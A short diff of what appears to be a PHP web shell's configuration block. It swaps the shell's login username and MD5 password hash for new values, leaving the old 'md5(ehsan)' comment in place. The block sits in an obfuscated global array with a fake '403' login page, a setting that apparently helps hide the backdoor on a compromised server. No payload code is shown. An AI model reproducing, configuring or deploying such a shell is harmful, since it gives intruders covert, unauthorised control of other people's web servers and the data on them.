@@ -7,8 +7,8 @@
 	Date:		Monday, September 14, 2020
 */
 $GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'R10T',
-    'password' => '6fec6b83b1fec8a924e7222124cf6e75',//md5(ehsan)
+    'username' => 'JANCOEX',
+    'password' => 'a04139c2a4cdd3cebb02675aaeaadb27',//md5(ehsan)
     'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
